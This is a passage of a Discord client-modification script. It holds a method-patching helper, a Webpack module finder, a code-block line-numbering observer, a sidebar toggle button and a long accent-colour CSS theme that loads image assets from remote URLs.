     * @param {doPatchCallback} options.instead Callback that will be called instead of original target method call. You can get access to original method using `originalMethod` parameter if you want to call it, but you do not have to. Can't be combined with `before` and `after`.
     * @param {boolean} [options.once=false] Set to true if you want automatically unpatch method after first call.
     * @param {boolean} [options.silent=false] Set to true if you want to suppress log messages about patching and unpatching. Useful to avoid clogging the console in case of frequent conditional patching/unpatching, for example from another monkeyPatch callback.
     * @param {boolean} [options.displayName] You can provide meaningful name of class/object provided in `what` param for logging purposes. By default there will be a try to determine name automatically.
     * @return {cancelPatch} Function with no arguments and no return value that should be called to cancel (unpatch) this patch. You should save and run it when your plugin is stopped.
     */
    const monkeyPatch = window.DiscordInternals && window.DiscordInternals.monkeyPatch || ((what, methodName, options) => {
        const {before, after, instead, once = false, silent = false} = options;
        const displayName = options.displayName || what.displayName || what.name || what.constructor.displayName || what.constructor.name;
        if (!silent) console.log('patch', methodName, 'of', displayName);
        const origMethod = what[methodName];
        const cancel = () => {
            if (!silent) console.log('unpatch', methodName, 'of', displayName);
            what[methodName] = origMethod;
        };
        what[methodName] = function() {
            /**
             * @interface
             * @name PatchData
             * @property {object} thisObject Original `this` value in current call of patched method.
             * @property {Arguments} methodArguments Original `arguments` object in current call of patched method. Please, never change function signatures, as it may cause a lot of problems in future.
             * @property {cancelPatch} cancelPatch Function with no arguments and no return value that may be called to reverse patching of current method. Calling this function prevents running of this callback on further original method calls.
             * @property {function} originalMethod Reference to the original method that is patched. You can use in if you need some special usage. You should explicitly provide this value and method arguments when you call this function.
             * @property {originalMethodCall} callOriginalMethod This is a shortcut for calling original method using this and arguments from data object.
             * @property {*} returnValue This is a value returned from original function call. This property is avilable only in `after` callback, or in `instead` callback after calling `callOriginalMethod` function
             */
            const data = {
                thisObject: this,
                methodArguments: arguments,
                cancelPatch: cancel,
                originalMethod: origMethod,
                callOriginalMethod: () => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)
            };
            if (instead) {
                const tempRet = instead(data);
                if (tempRet !== undefined)
                    data.returnValue = tempRet;
            }
            else {
                if (before) before(data);
                data.callOriginalMethod();
                if (after) after(data);
            }
            if (once) cancel();
            return data.returnValue;
        };
        what[methodName].__monkeyPatched = true;
        what[methodName].displayName = 'patched ' + (what[methodName].displayName || methodName);
        return cancel;
    });

    /**
     * @author samogot
     */
    const WebpackModules = window.DiscordInternals && window.DiscordInternals.WebpackModules || (() => {

        const req = typeof(webpackJsonp) == "function" ? webpackJsonp([], {
                '__extra_id__': (module, exports, req) => exports.default = req
        }, ['__extra_id__']).default : webpackJsonp.push([[], {
                '__extra_id__': (module, exports, req) => module.exports = req
        }, [['__extra_id__']]]);
        delete req.m['__extra_id__'];
        delete req.c['__extra_id__'];

        /**
         * Predicate for searching module
         * @callback modulePredicate
         * @param {*} module Module to test
         * @return {boolean} Thue if it is module that you need
         */

        /**
         * Look through all modules of internal Discord's Webpack and return first one that match filter predicate.
         * At first this function will look thruogh alreary loaded modules cache. If no one of loaded modules is matched - then this function tries to load all modules and match for them. Loading any module may have unexpected side effects, like changing current locale of moment.js, so in that case there will be a warning the console. If no module matches - function will return null. You sould always take such predicate to match something, gut your code should be ready to recieve null in case if Discord update something in codebase.
         * If module is ES6 module and hafe default property - only default would be considered, otherwise - full module object.
         * @param {modulePredicate} filter Predicate to match module
         * @return {*} First module that matched by filter or null if none is matched.
         */
        const find = (filter) => {
            for (let i in req.c) {
                if (req.c.hasOwnProperty(i)) {
                    let m = req.c[i].exports;
                    if (m && m.__esModule && m.default)
                        m = m.default;
                    if (m && filter(m))
                        return m;
                }
            }
            console.warn('Cannot find loaded module in cache.');
            return null;
        };

        /**
         * Look through all modules of internal Discord's Webpack and return first object that has all of following properties. You should be ready that in any moment, after Discord update, this function may start returning null (if no such object exists any more) or even some different object with the same properties. So you should provide all property names that you use, and often even some extra properties to make sure you'll get exactly what you want.
         * @see Read {@link find} documentation for more details how search works
         * @param {string[]} propNames Array of property names to look for
         * @return {object} First module that matched by propNames or null if none is matched.
         */
        const findByUniqueProperties = (propNames) => find(module => propNames.every(prop => module[prop] !== undefined));

        /**
         * Look through all modules of internal Discord's Webpack and return first object that has displayName property with following value. This is useful for searching React components by name. Take into account that not all components are exported as modules. Also there might be several components with same names
         * @see Use {@link ReactComponents} as another way to get react components
         * @see Read {@link find} documentation for more details how search works
         * @param {string} displayName Display name property value to look for
         * @return {object} First module that matched by displayName or null if none is matched.
         */
        const findByDisplayName = (displayName) => find(module => module.displayName === displayName);

        return {find, findByUniqueProperties, findByDisplayName};

    })();

    window.setTimeout(start, 5000);
})();

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| CodeBlock Line Numbers |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
(function ($) {
    "use strict";

    // Helper function for finding all elements matching selector affected by a mutation
    function mutationFind(mutation, selector) {
        var target = $(mutation.target), addedNodes = $(mutation.addedNodes);
        var mutated = target.add(addedNodes).filter(selector);
        var descendants = addedNodes.find(selector);
        var ancestors = target.parents(selector);
        return mutated.add(descendants).add(ancestors);
    }

    // Watch for new code blocks
    new MutationObserver(function (mutations, observer) {
        mutations.forEach(function (mutation) {
            mutationFind(mutation, ".hljs").not(":has(ol)")
                .each(function () {
                    this.innerHTML = this.innerHTML.split("\n").map(line => "<li>"+line+"</li>").join("");
                })
                .wrapInner($("<ol>").addClass("kawaii-linenumbers"));
        });
    }).observe(document, { childList:true, subtree:true });
})(jQuery.noConflict(true));

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Channel Hide/Show ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

(function() {
    'use strict';

    // Classes of DIVs you want to be able to toggle sidebar
    const toggleButtons = [
        "children-19S4PO",
        "toggleChannelsBtn"
    ];
    const columnToHide = "sidebar-2K8pFh"
    const showHideSidebarButtonParentClass = "scroller-2TZvBN";
    //const showHideSidebarButtonParentClass = "wrapper-1Rf91z"; //top bar instead
    const roomDivClass = "containerDefault-1ZnADq";
    const unreadClass = "unread-3zKkbm";
    const channelsWidth = "240px";

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function pageload() {
        // Wait 5 seconds for page to load
        await sleep(5000);
        main()
    }

    const toggleVisibility = function() {
        let sidebar = document.getElementsByClassName(columnToHide)[0];
        sidebar.style.transition = "width 150ms ease-out, opacity 150ms ease-out";
        if (sidebar.style.width == "1px") {
            sidebar.style.width = channelsWidth;
            sidebar.style.opacity = "1";
        } else {
            sidebar.style.width = "1px";
            sidebar.style.opacity = "0";
        }
    }

    let cheveronDirection = function() {
        const sidebar = document.getElementsByClassName(columnToHide)[0]
        const btn = document.getElementById("dtcb-cheverons")
        if (sidebar.style.width == "1px") {
            btn.innerText = "›"; // symbol for >
        } else {
            btn.innerText = "‹"; // symbol for <
        }
    }

    const createSidebarButton = function() {
        let btnDiv = document.createElement("div");
        btnDiv.setAttribute("class", "toggleChannelsBtn");
        btnDiv.setAttribute("id", "toggleChannelsBtn");
        btnDiv.style.color = "#FFFFFF";
        btnDiv.style.position = "absolute";
        btnDiv.style.top = "21px";
        btnDiv.style.left = "68px";
        btnDiv.style.zIndex = "2";
// Button Itself
        let btn = document.createElement("p");
        btn.setAttribute("id", "dtcb-cheverons");
        btn.innerText = "‹"; // symbol for <
        btn.style.margin = "0px";
        btn.style.position = "fixed";
        btn.style.cursor = "pointer";
        btn.style.backgroundColor = "#36393f";
        btn.style.borderTopRightRadius = "10px";
        btn.style.height = "inherit";
        btn.style.borderBottomRightRadius = "10px";
        btn.style.color = "unset";
        btn.style.padding = "5px 5px 10px";
        btn.style.justifyContent = "center";
        btn.style.fontSize = "15px";
        btnDiv.appendChild(btn);
        return btnDiv;
    }

    const addListenersToToggleButtons = function() {
        toggleButtons.forEach(function(elem) {
            document.getElementsByClassName(elem)[0].addEventListener('click', function() {
                toggleVisibility();
                cheveronDirection();
            })
        });
    }

    const autohideSidebar = function() {
        const roomDivs = document.getElementsByClassName(roomDivClass)
        Array.from(roomDivs).forEach(function(room) {
            room.addEventListener('click', function() {
                toggleVisibility();
                cheveronDirection();
            })
        })
    }



    const main = function() {
        console.log("[*] Loading Discord Toggle Channenels Bar");
        const newBtn = createSidebarButton()
        document.getElementsByClassName(showHideSidebarButtonParentClass)[0].appendChild(newBtn)
        addListenersToToggleButtons();
        autohideSidebar();
    }

    pageload();
})();


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Theme 1 ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

(function() {
let css = `
/* ==UserStyle==

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| EXTENSIONS |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| EXTENSIONS | ThemeDevBadge |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.dev-A7f2Rx.hasBadge-4rT8_u .mask-1l8v16 {
	-webkit-mask: url('data:image/svg+xml; utf8, <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 1 1"><g fill="none" fill-rule="evenodd"><path fill="white" d="M0 0 h 1 v 1 h -0.7 v -0.353 h -0.3 z"/></g></svg>') center/cover no-repeat;
}
.dev-A7f2Rx.hasBadge-4rT8_u .avatarHint-1qgaV3 {
	-webkit-mask: url('data:image/svg+xml; utf8, <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 1 1"><g fill="none" fill-rule="evenodd"><path fill="white" d="M0 0 h 1 v 1 h -0.66 v -0.33 h -0.33 z"/></g></svg>');
}
.dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	-webkit-mask: url('data:image/svg+xml; utf8, <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 508.52 508.52" style="enable-background:new 0 0 508.52 508.52;" xml:space="preserve"><path fill="black" d="M63.565, 476.737c0, 12.84, 7.755, 24.473, 19.61, 29.367c3.941, 1.621, 8.073, 2.415, 12.173, 2.415c8.263, 0, 16.4-3.242, 22.47-9.312L254.26, 362.765l136.442, 136.442c6.07, 6.07, 14.207, 9.312, 22.47, 9.312c4.1, 0, 8.232-0.795, 12.141-2.415c11.887-4.894, 19.642-16.527, 19.642-29.367V165.347H63.565V476.737z"/><path fill="black" d="M413.172, 0H95.347C77.804, 0, 63.565, 14.239, 63.565, 31.782v61.782h381.39V31.782C444.955, 14.239, 430.716, 0, 413.172, 0z"/></svg>') center/cover no-repeat !important;
	background: #7289da !important;
	position: absolute !important;
	width: 30% !important;
	height: 30% !important;
	top: 74% !important;
	left: 1.5% !important;
}
.root-SR8cQa .topSectionPlaying-1J5E4n .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s,
.userPopout-3XzG_A .headerPlaying-j0WQBV .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	filter: brightness(80%) !important;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| EXTENSIONS | Burple Recolor ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/* Blurple Recolor | Changed the basic accent color  (made by mwittrien)*/
:root {
	--daccentcolor: 114,137,218;
	--vaccentcolor: var(--accentcolor, var(--daccentcolor));
	--daccentcolor2: 255,115,250;
	--vaccentcolor2: var(--accentcolor2, var(--daccentcolor2));
	--dlinkcolor: 0,176,244;
	--vlinkcolor: var(--linkcolor, var(--dlinkcolor));

	--dfontwhite1: 255,255,255;

	--vaccentcolor-hover: rgb(var(--vaccentcolor)) linear-gradient(0deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0.15));
	--vaccentcolor-active: rgb(var(--vaccentcolor)) linear-gradient(0deg, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.3));
	--vaccentcolor2-hover: rgb(var(--vaccentcolor2)) linear-gradient(0deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0.15));
	--vaccentcolor2-active: rgb(var(--vaccentcolor2)) linear-gradient(0deg, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.3));

	--bdfdb-blurple: rgb(var(--vaccentcolor)) !important;
	--bd-blue: rgb(var(--vaccentcolor)) !important;
	--bd-blue-hover: var(--vaccentcolor-hover) !important;
	--bd-blue-active: var(--vaccentcolor-active) !important;
	--blurple: rgb(var(--vaccentcolor)) !important;
}
.theme-dark, .theme-light {
	--text-link: rgb(var(--vlinkcolor));
	--focus-primary: rgb(var(--vlinkcolor));
	--radio-group-dot-foreground: rgb(var(--vaccentcolor));
}
.theme-light {
	--logo-primary: rgb(var(--vaccentcolor));
}


/* ~~~~		0.		TABLE OF CONTENTS				~~~~ */
/*
	1.	GUILDLIST
	2.	CHANNELLIST
	3.	CHAT
		1.	MESSAGES
		2.	TEXTAREA
		3.	AUTOCOMPLETEMENU
		4.	MEMBERLIST
		5.	SEARCHPAGE
		6.	CALL
	4.	PEOPLES
	5.	STORE/NITRO
	6.	LIBRARY
	7.	DISCOVERY
	8.	USERSETTINGS
	9.	GUILDSETTINGS
	10.	MODALS
		1.	USERMODAL
		2.	GUILDADD/CREATION
		3.	REGIONSELECTMODAL
		4.	UPLOADMODAL
		5.	KEYBOARDSHORTCUTSMODAL
		6.	LOGINSCREEN
		7.	DOWNLOADAPPMODAL
		8.	GUILDBOOSTMODAL
		9.	STREAMSETTINGSMODAL
		10.	DISPATCHERRORMODAL
		11.	CHANGELOGMODAL
		12.	SCREENSHAREMODAL
		13.	PHONEVERIFICATIONMODAL
		14.	CUSTOMSTATUSMODAL
	11.	POPOUTS
		1.	CONTEXTMENU
		2.	USERPOPOUT
		3.	EMOJIPICKER
		4.	PINS/MENTIONS
		5.	SEARCHPOPOUT
	12.	GENERAL
		1.	TEXT
		2.	BUTTONS
		3.	INPUTS
		4.	TAGS
		5.	ICONS
		6.	SCROLLBARS
		7.	NOTIFICATIONBAR
		8.	TOOLTIPS
		9.	TOASTS
	13.	BDSUPPORT
	14.	POWERCORDSUPPORT
	15.	PLUGINSUPPORT
		1.	IMAGEZOOM
		2.	HIDEUTILS
		3.	READALLNOTIFICATIONSBUTTON
		4.	SERVERSEARCH
		5.	CHANNELTABS
	16.	THEMESUPPORT
		1.	THEMEDEVBADGE
*/


/* ~~~~		1.		GUILDLIST						~~~~ */

.wrapper-1BJsBx.selected-bZ3Lue .childWrapper-anI2G9,		/* home/acronym												*/
.wrapper-1BJsBx:hover .childWrapper-anI2G9 {
	background-color: rgb(var(--vaccentcolor));
}

.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 1"] {
	background-color: rgba(var(--vaccentcolor), 1) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.9"] {
	background-color: rgba(var(--vaccentcolor), 0.9) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.8"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.7"] {
	background-color: rgba(var(--vaccentcolor), 0.7) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.6"] {
	background-color: rgba(var(--vaccentcolor), 0.6) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.5"] {
	background-color: rgba(var(--vaccentcolor), 0.5) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.4"] {
	background-color: rgba(var(--vaccentcolor), 0.4) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.3"] {
	background-color: rgba(var(--vaccentcolor), 0.3) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.2"] {
	background-color: rgba(var(--vaccentcolor), 0.2) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.1"] {
	background-color: rgba(var(--vaccentcolor), 0.1) !important;
}
.folderIconWrapper-226oVY svg[style^="color: rgb(114, 137, 218)"],
.folderIconWrapper-226oVY svg[style*=" color: rgb(114, 137, 218)"] {
	color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		2.		CHANNELLIST						~~~~ */

.background-2uufRq {										/* guild header			partnerbadge						*/
	color: rgb(var(--vaccentcolor));
}
.iconTierThree-3EAOB7 {										/* guild header			icontier3							*/
	color: rgb(var(--vaccentcolor2));
}
.subscribeTooltipWrapper-32-Ce8 {							/* guild header			subscribetooltip					*/
	background-color: rgb(var(--vaccentcolor));
}
.subscribeTooltipWrapper-32-Ce8::after {
	border-bottom-color: rgb(var(--vaccentcolor));
}

.channelNotice-1-XFjC::before,								/* channel notice											*/
.channelNotice-1-XFjC::after,
.channelNotice-3DDmsB::before,
.channelNotice-3DDmsB::after,
#app-mount .channelNotice-3hkOiI::before,
#app-mount .channelNotice-3hkOiI::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
}
.channelNotice-1-XFjC.quickswitcher-35bYg4 {
	background: transparent;
}
.channelNotice-1-XFjC.quickswitcher-35bYg4::before {
	filter: grayscale(0.5);
	background: url(https://discord.com/assets/8fdb69b7684b8e1ecb3fdde909daca41.svg) center 35px no-repeat;
}
.channelNotice-1-XFjC.premiumGuildSubscription-3oKecP {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/channelnotice_premium_bg.svg) center 23px no-repeat;
}
.channelNotice-1-XFjC.premiumGuildSubscription-3oKecP::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/channelnotice_premium_accent.svg) center 23px no-repeat;
}
.channelNotice-1-XFjC.publicUpsell-31ZSJ8::before {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/channelnotice_upsell_bg.svg) center 12px no-repeat;
}
.channelNotice-1-XFjC.publicUpsell-31ZSJ8::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/channelnotice_upsell_accent.svg) center 12px no-repeat;
}


/* ~~~~		3.		CHAT							~~~~ */

/* ----		3.1.	MESSAGES						---- */

.newMessagesBar-265mhP {									/* new messagesbar											*/
	background-color: rgb(var(--vaccentcolor));
}

.hasMore-3POVhk {											/* hasmore messagesbar										*/
	color: rgb(var(--vaccentcolor));
}

.backgroundFlash-24qWLN[style*="background-color: rgb(114, 137, 218)"],
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 1"] {
	background-color: rgba(var(--vaccentcolor), 1) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.9"] {
	background-color: rgba(var(--vaccentcolor), 0.9) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.8"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.7"] {
	background-color: rgba(var(--vaccentcolor), 0.7) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.6"] {
	background-color: rgba(var(--vaccentcolor), 0.6) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.5"] {
	background-color: rgba(var(--vaccentcolor), 0.5) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.4"] {
	background-color: rgba(var(--vaccentcolor), 0.4) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.3"] {
	background-color: rgba(var(--vaccentcolor), 0.3) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.2"] {
	background-color: rgba(var(--vaccentcolor), 0.2) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.1"] {
	background-color: rgba(var(--vaccentcolor), 0.1) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.0"] {
	background-color: rgba(var(--vaccentcolor), 0.0) !important;
}

.embedFull-2tM8--[style*="border-color: rgb(114, 137, 218)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}

.ephemeral-1PsL1r,											/* localbot				container							*/
.replying-1x3H0T {											/* replying				container							*/
	background-color: rgba(var(--vaccentcolor), 0.05);
}
.ephemeral-1PsL1r::before,									/* localbot				before								*/
.replying-1x3H0T::before {									/* replying				before								*/
	background-color: rgb(var(--vaccentcolor));
}
.message-2qnXI6.ephemeral-1PsL1r.selected-2P5D_Z,
.mouse-mode.full-motion .ephemeral-1PsL1r:hover,
.mouse-mode .ephemeral-1PsL1r:hover,
.message-2qnXI6.replying-1x3H0T.selected-2P5D_Z,
.mouse-mode.full-motion .replying-1x3H0T:hover,
.mouse-mode .replying-1x3H0T:hover {
	background-color: rgba(var(--vaccentcolor), 0.1);
}
.ephemeralMessage-1fEWtQ a {								/* localbot				operations							*/
	color: rgb(var(--vaccentcolor));
}

.operations-36ENbA > a {									/* message				operations							*/
	color: rgb(var(--vaccentcolor));
}

.command-2EsN1V {											/* command				used command						*/
	color: rgb(var(--vaccentcolor));
}

.icon-360yEu {												/* systemmessage		guild sub easter egg icon			*/
	color: rgb(var(--vaccentcolor2));
}

.message-15tBk4 strong,										/* mention				in header							*/
.wrapper-3WhCwL {											/* mention													*/
	background-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}
.message-15tBk4 strong:hover,
.interactive:hover {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .mentioned-xhSam7 .mention.interactive:hover {
	color: rgb(var(--vaccentcolor));
}

.reactionMe-wv5HKu .reactionCount-2mvXRV,					/* reaction				count me							*/
.reactionMe-wv5HKu:hover .reactionCount-2mvXRV {
	color: rgb(var(--vaccentcolor));
}
.reaction-1hd86g.reactionMe-wv5HKu {						/* reaction				wrapper me							*/
	background-color: rgba(var(--vaccentcolor), 0.3);
}
															/* attachment			upload bar							*/
.progressBar-3u8FBM[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		3.2.	TEXTAREA						---- */
															/* textarea				follow channel icon					*/
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/chatnotice_followchannel_bg.svg) center/contain no-repeat;
	width: 47px;
	height: 60px;
	margin-bottom: -8px;
}
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] + * {
	overflow: visible;
}
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] + *::after {
	content: "";
	position: absolute;
	bottom: 8px;
	left: 16px;
	width: 47px;
	height: 60px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/chatnotice_followchannel_accent.svg) center/contain no-repeat;
}
															/* textarea				verify email icon					*/
.image-3XsqGc[src="/assets/b0df989dede2e65a2d631874ffe04de0.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/chatnotice_verifyemail_bg.svg) center/contain no-repeat;
	width: 65px;
	height: 60px;
	margin-bottom: -16px;
}
.image-3XsqGc[src="/assets/b0df989dede2e65a2d631874ffe04de0.svg"] + * {
	overflow: visible;
}
.image-3XsqGc[src="/assets/b0df989dede2e65a2d631874ffe04de0.svg"] + *::after {
	content: "";
	position: absolute;
	bottom: 0px;
	left: 16px;
	width: 65px;
	height: 60px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/chatnotice_verifyemail_accent.svg) center/contain no-repeat;
}

/* ----		3.3.	AUTOCOMPLETEMENU				---- */

#app-mount .active-2awTSY {									/* autocomplete			option active						*/
	background-color: rgb(var(--vaccentcolor)) !important;
}

#app-mount .searchSuggestion-2K8OBX:hover {					/* gifpicker			suggestions							*/
	border-color: rgb(var(--vaccentcolor));
	background-color: rgb(var(--vaccentcolor));
}
.result-3w1ZcL[style*="background-color"] {					/* gifpicker			result loading						*/
	background-color: rgb(var(--vaccentcolor)) !important;
}
.result-3w1ZcL[style*="background-color: rgb(146, 154, 250)"] {
	background: var(--vaccentcolor-hover) !important;
}
.result-3w1ZcL[style*="background-color: rgb(179, 174, 255)"] {
	background: var(--vaccentcolor-active) !important;
}
.theme-light .focused-1En8bG::after,						/* gifpicker			result hover						*/
.theme-light .result-3w1ZcL:hover::after {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor)), inset 0 0 0 3px #dcddde;
}
.theme-dark .focused-1En8bG::after,							/* gifpicker			result hover						*/
.theme-dark .result-3w1ZcL:hover::after {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor)), inset 0 0 0 3px #2f3136;
}
#app-mount .categoryFadeBlurple-1j72_A {					/* gifpicker			categoryfade						*/
	background-color: rgba(var(--vaccentcolor), 0.8);
}
#app-mount .categoryFadeBlurple-1j72_A:hover {
	background-color: rgba(var(--vaccentcolor), 0.95);
}
.introductionAction-M1r6AX {								/* gifpicker			introductionaction tooltip			*/
	color: rgb(var(--vaccentcolor));
}
.iconColorLightBlue-zbxJUe {								/* stickerpicker		icon lightblue						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
.iconColorDarkBlue-6qQpJf {									/* stickerpicker		icon darkblue						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
.iconColorPink-1dhBIv {										/* stickerpicker		icon pink							*/
	color: rgb(var(--vaccentcolor2));
}

/* ----		3.4.	MEMBERLIST						---- */

.premiumIcon-1rDbWQ {
	color: rgb(var(--vaccentcolor2));
}

/* ----		3.5.	SEARCHPAGE						---- */

#app-mount .activeButton-rvKcqq,
#app-mount .activeButton-rvKcqq:hover {
	background-color: rgb(var(--vaccentcolor));
}
.noResultsImage-3Y0eCI.alt-3EpRdH {
	display: flex;
}
.noResultsImage-3Y0eCI.alt-3EpRdH::before {
	content: "";
	position: absolute;
	width: 160px;
	height: 160px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/searchpage_noresults_accent.svg) center/cover no-repeat;
}

/* ----		3.6.	CALL							---- */

.sparkleBlurple-awNnsZ {
	background-image: url(https://discordapp.com/assets/c7539bb38577495f5021c8ea455c7145.png);
}
.popBlurple-27zBE3 {
	background-image: url(https://discordapp.com/assets/237a2f9325a83d230fb30b2cd63bbfe6.png);
}
.lightBlurple-1mZKpk {
	background-image: url(https://discordapp.com/assets/1c20f6ecd2d83c1844a3fd6da306d239.png);
}
.crossBlurple--iGG5Y {
	background-image: url(https://discordapp.com/assets/c13a0b03a798023c27155fad5f0c7a61.png);
}


/* ~~~~		4.		PEOPLES							~~~~ */

.wrapper-1cBijl .btn:disabled {								/* addfriendpage		button								*/
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		5.		STORE/NITRO						~~~~ */

#app-mount .premiumIndicator-1XvbfM {						/* premium				where?								*/
	background-color: rgb(var(--vaccentcolor));
}

.gridItemGuildSubscription-1sZ0fD::before {
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(162, 48, 194), rgba(162, 48, 194, 0.5));
}
.gridItemBadge-1Se-Pu::before {
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}

.activeTransferGuildCardBorder-2jUQ7t{
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.premiumGuildSubscriptionRowActive-1WxLXI{
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}

.theme-light .animationContainer-cNePAf {
	color: rgb(var(--vaccentcolor));
}
.theme-light .shine-KMI5j7 {
